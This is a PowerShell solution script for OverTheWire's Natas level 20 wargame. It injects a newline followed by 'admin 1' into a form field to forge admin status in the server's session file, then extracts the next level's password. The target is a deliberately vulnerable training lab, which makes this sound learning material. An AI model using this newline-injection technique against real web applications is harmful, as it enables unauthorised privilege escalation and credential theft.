$Init = 19
$Username = 'natas' + ($Init + 1)
$Password = Get-Content -Path ../Pwds.txt | Select-Object -Skip $Init | Select-Object -First 1
$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))
$Uri = "http://$Username.natas.labs.overthewire.org/?debug=true"

$Session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$Cookie = New-Object System.Net.Cookie("PHPSESSID", 'pnopkdt5pi9g60mrqqffk2eu5l', '/', "$Username.natas.labs.overthewire.org")
$Session.Cookies.Add($Cookie)

$Request = @{
    Uri = $Uri
    Method = 'GET'
    Headers = @{ Authorization = "Basic $Creds" }
    WebSession = $Session
}

function Invoke-Get {
    $Request['Method'] = 'GET'
    
    return Invoke-WebRequest @Request
}

function Invoke-Post {
    param (
        [string]$Name
    )

    $Request['Method'] = 'POST'
    $Request['Headers']['Content-Type'] = 'application/x-www-form-urlencoded'
    $Request['Body'] = @{ name = $Name }

    return Invoke-WebRequest @Request
}

Invoke-Get | Out-Null
Invoke-Post -Name "test`nadmin 1" | Out-Null
$Password = (Invoke-Get | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -First 1).Matches.Groups[1]
Write-Host -ForegroundColor Green $Password
